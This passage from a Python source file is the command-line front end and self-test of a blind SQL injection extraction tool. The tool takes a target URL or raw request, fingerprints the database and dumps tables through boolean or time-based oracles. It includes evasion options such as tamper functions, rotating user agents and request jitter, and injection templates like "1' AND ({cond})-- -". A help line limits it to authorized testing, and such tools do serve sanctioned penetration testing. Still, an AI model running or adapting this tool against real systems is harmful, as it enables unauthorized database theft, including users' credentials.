                    return bool(conn.execute("SELECT (%s)" % cond).fetchone()[0])
                except Exception:
                    return False  # mirrors a DB error rendering as 'false'

    results = {}

    def check(name, got, expected):
        ok = got == expected
        results[name] = ok
        (LOG.ok if ok else LOG.error)("%-22s %s" % (name, "PASS" if ok else "FAIL got=%r exp=%r" % (got, expected)))

    for bitwise in (True, False):
        for threads in (1, 8):
            tag = "%s/%dthr" % ("bitwise" if bitwise else "binsearch", threads)
            ex = Extractor(SqliteOracle(), "sqlite", threads=threads, bitwise=bitwise, bits=8)

            check("%s int" % tag, ex.extract_int("SELECT COUNT(*) FROM users"), 4)
            check("%s scalar" % tag, ex.scalar("k", "SELECT username FROM users LIMIT 1 OFFSET 0"), "admin")

            tables = set(ex.list_tables("main"))
            check("%s tables" % tag, {"users", "products"} <= tables, True)

            cols = ex.list_columns("main", "users")
            check("%s columns" % tag, cols, ["id", "username", "password", "email"])

            rows = ex.dump("main", "users", cols)
            check("%s dump rows" % tag, len(rows), 4)
            check("%s dump admin" % tag, rows[0],
                  {"id": "1", "username": "admin",
                   "password": "5f4dcc3b5aa765d61d8327deb882cf99", "email": "admin@corp.local"})
            check("%s null/empty" % tag, rows[2]["password"], "")  # empty string column
            check("%s where" % tag,
                  ex.dump("main", "users", ["username"], where="id=2"), [{"username": "alice"}])

    # Unicode / code-point extraction (sqlite UNICODE() returns true code points).
    uex = Extractor(SqliteOracle(), "sqlite", threads=4, bitwise=False, max_codepoint=0x10FFFF)
    urow = uex.dump("main", "users", ["username", "password", "email"], where="id=4")[0]
    check("unicode username", urow["username"], "José")
    check("unicode emoji pw", urow["password"], "naïve🔑")
    check("unicode email", urow["email"], "jose@café.local")

    # Byte-mode reassembly logic (decode of an assembled UTF-8 byte buffer).
    check("utf8 byte decode", bytes([0x6e, 0x61, 0xc3, 0xaf, 0x76, 0x65]).decode("utf-8"), "naïve")

    # Raw-request parser sanity check.
    import tempfile
    req = ("POST /search HTTP/1.1\nHost: target.example\n"
           "Content-Type: application/x-www-form-urlencoded\n\nq=widget{q}&page=1")
    tf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    tf.write(req)
    tf.close()
    rr = RawRequest.from_file(tf.name, "{q}", "https")
    method, url, headers, body = rr.build("' AND (1=1)-- -")
    os.unlink(tf.name)
    check("raw method", method, "POST")
    check("raw url", url, "https://target.example/search")
    check("raw body marker", "{q}" not in (body or ""), True)
    check("raw host header", headers.get("Host"), "target.example")

    # Tamper sanity.
    check("tamper space2comment", _t_space2comment("a b"), "a/**/b")
    check("string literal hex", make_string_literal("mysql", "ab"), "0x6162")

    # Every built-in time wrapper must format with only {c} and {d}.
    for name, d in DIALECTS.items():
        tw = d.get("time_wrap")
        if not tw:
            continue
        try:
            tw.format(c="1=1", d=5)
            ok = True
        except Exception:
            ok = False
        check("time_wrap fmt %s" % name, ok, True)

    passed = sum(results.values())
    total = len(results)
    print()
    (LOG.ok if passed == total else LOG.error)("Self-test: %d/%d checks passed." % (passed, total))
    return 0 if passed == total else 1


# ==========================================================================
# CLI
# ==========================================================================
def parse_args(argv):
    p = argparse.ArgumentParser(
        description="Blind SQL injection extraction framework (authorized testing only).",
        epilog="Time-based recipes per DBMS and a full walkthrough are in README.md. "
               "Run --self-test to verify the engine offline.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    g = p.add_argument_group("target / request")
    g.add_argument("--url", help="Target URL of the injectable endpoint.")
    g.add_argument("--method", default="GET", choices=["GET", "POST", "get", "post"])
    g.add_argument("--param", help="Name of the injectable parameter.")
    g.add_argument("--template", default="1' AND ({cond})-- -",
                   help="Full injected value; must contain the literal {cond} placeholder.")
    g.add_argument("--param-data", default="", help="Other static params, urlencoded: 'a=1&b=2'.")
    g.add_argument("--header", action="append", default=[], help="Extra header 'Name: value' (repeatable).")
    g.add_argument("--cookie", help="Cookie header value.")
    g.add_argument("--json", action="store_true", help="Send POST body as JSON.")
    g.add_argument("-r", "--request-file", help="Raw HTTP request file with a {q} (see --marker) injection point.")
    g.add_argument("--marker", default="{q}", help="Injection marker used inside the raw request file.")
    g.add_argument("--scheme", default="https", help="Scheme for raw requests with a relative path.")
    g.add_argument("--follow-redirects", action="store_true")
    g.add_argument("--insecure", action="store_true", help="Skip TLS verification.")
    g.add_argument("--timeout", type=float, default=20.0)
    g.add_argument("--retries", type=int, default=2)
    g.add_argument("--no-urlencode", action="store_true", help="Do not URL-encode the value in raw-request URLs.")

    g = p.add_argument_group("oracle")
    g.add_argument("--technique", default="auto", choices=["auto", "boolean", "time"])
    g.add_argument("--true-string", help="Substring present ONLY when the condition is TRUE.")
    g.add_argument("--len-threshold", type=int, default=16, help="Min body-length delta for length oracle.")
    g.add_argument("--time-delay", type=int, default=5, help="Seconds the DB sleeps when a time condition is TRUE.")
    g.add_argument("--time-samples", type=int, default=3, help="Baseline samples for time calibration.")
    g.add_argument("--time-template", help="Custom time wrapper containing {c} and {d}.")

    g = p.add_argument_group("extraction / performance")
    g.add_argument("--dbms", default="mysql", choices=list(DIALECTS.keys()) + ["auto"])
    g.add_argument("--threads", type=int, default=1, help="Concurrent workers.")
    g.add_argument("--rps", type=float, default=0, help="Global request rate cap (req/s). 0 = unlimited.")
    g.add_argument("--delay", type=float, default=0.0, help="Base delay (s) before each request.")
    g.add_argument("--jitter", type=float, default=0.0, help="Random extra delay 0..jitter (s).")
    g.add_argument("--no-bitwise", action="store_true", help="Use binary search instead of bitwise char extraction.")
    g.add_argument("--bits", type=int, default=8, help="Bits per character for bitwise mode (7=ASCII, 8=latin-1).")
    g.add_argument("--unicode", action="store_true",
                   help="Code-point extraction up to U+10FFFF (sqlite/postgres give true code points; mssql/oracle BMP only).")
    g.add_argument("--bytes", dest="byte_mode", action="store_true",
                   help="Extract raw UTF-8 bytes and reassemble (most reliable multibyte mode; mysql/postgres).")
    g.add_argument("--max-codepoint", type=int, default=None,
                   help="Override the max code point searched per character (default 127, or 0x10FFFF with --unicode).")
    g.add_argument("--tamper", help="Comma-separated tamper functions: " + ",".join(TAMPERS))
    g.add_argument("--random-agent", action="store_true", help="Rotate User-Agent per request.")
    g.add_argument("--proxy", help="Proxy URL, e.g. http://127.0.0.1:8080 (route through Burp/ZAP).")

    g = p.add_argument_group("action / data")
    g.add_argument("--action", choices=["fingerprint", "banner", "current-db", "dbs", "tables", "columns", "dump"])
    g.add_argument("--db", help="Database/schema name.")
    g.add_argument("--table", help="Table name.")
    g.add_argument("--columns", help="Comma-separated columns to dump; omit to auto-enumerate.")
    g.add_argument("--where", help="Row filter for dump (raw SQL, e.g. \"id<100\").")

    g = p.add_argument_group("output / misc")
    g.add_argument("--output", help="Write results to file (.csv/.json), else pretty TSV to stdout.")
    g.add_argument("--resume", help="Checkpoint file for resumable extraction.")
    g.add_argument("--dry-run", action="store_true", help="Print example payloads and exit.")
    g.add_argument("-v", "--verbose", action="count", default=0, help="-v info, -vv debug.")
    g.add_argument("--no-color", action="store_true")
    g.add_argument("--self-test", action="store_true", help="Run the offline engine self-test (no network).")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(sys.argv[1:] if argv is None else argv)

    global LOG
    LOG = Log(level={0: "info", 1: "info", 2: "debug"}.get(args.verbose, "debug"), color=not args.no_color)

    if args.self_test:
        return self_test()

    if not args.action:
        raise SystemExit("--action is required (or use --self-test).")
    if "{cond}" not in args.template:
        raise SystemExit("--template must contain the literal {cond} placeholder.")
    if not (args.url or args.request_file):
        raise SystemExit("Provide --url (+ --param) or -r/--request-file.")
    if args.url and not args.param:
        raise SystemExit("--param is required with --url.")

    requester = Requester(args)

    # Resolve DBMS (fingerprint first if auto).
    dbms = args.dbms
    if dbms == "auto":
        probe_oracle = Oracle(requester, args, DIALECTS["mysql"])
        LOG.info("Calibrating oracle for DBMS fingerprinting...")
        probe_oracle.calibrate()
        fp = Extractor(probe_oracle, "mysql").fingerprint()
        if not fp:
            raise SystemExit("DBMS fingerprinting failed. Specify --dbms explicitly.")
        LOG.ok("Fingerprinted DBMS: %s" % fp)
        dbms = fp

    dialect = DIALECTS[dbms]
    oracle = Oracle(requester, args, dialect)

    if args.dry_run:
        oracle.preview()
        return 0

    LOG.info("Calibrating %s oracle..." % args.technique)
    oracle.calibrate()

    if args.max_codepoint is not None:
        max_cp = args.max_codepoint
    elif args.unicode:
        max_cp = 0x10FFFF
    else:
        max_cp = 127

    cp = Checkpoint(args.resume)
    ex = Extractor(oracle, dbms, threads=args.threads,
                   bitwise=not args.no_bitwise, bits=args.bits, checkpoint=cp,
                   max_codepoint=max_cp, byte_mode=args.byte_mode)

    try:
        if args.action == "fingerprint":
            print(ex.fingerprint() or "unknown")

        elif args.action == "banner":
            for k, v in ex.banner().items():
                print("%-14s %s" % (k + ":", v))

        elif args.action == "current-db":
            print(ex.current_db())

        elif args.action == "dbs":
            for d in ex.list_dbs():
                print(d)

        elif args.action == "tables":
            if not args.db:
                raise SystemExit("--db is required for --action tables")
            for t in ex.list_tables(args.db):
                print(t)

        elif args.action == "columns":
            if not args.table:
                raise SystemExit("--table is required for --action columns")
            for c in ex.list_columns(args.db, args.table):
                print(c)

        elif args.action == "dump":
            if not args.table:
                raise SystemExit("--table is required for --action dump")
            if args.columns:
                cols = [c.strip() for c in args.columns.split(",") if c.strip()]
            else:
                LOG.info("Enumerating columns...")
                cols = ex.list_columns(args.db or ex.current_db(), args.table)
            rows = ex.dump(args.db, args.table, cols, where=args.where)
            write_rows(rows, cols, args.output)
    finally:
        cp.close()
        LOG.info("Done. " + requester.stats.summary())
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        LOG.warn("Interrupted.")
        sys.exit(130)
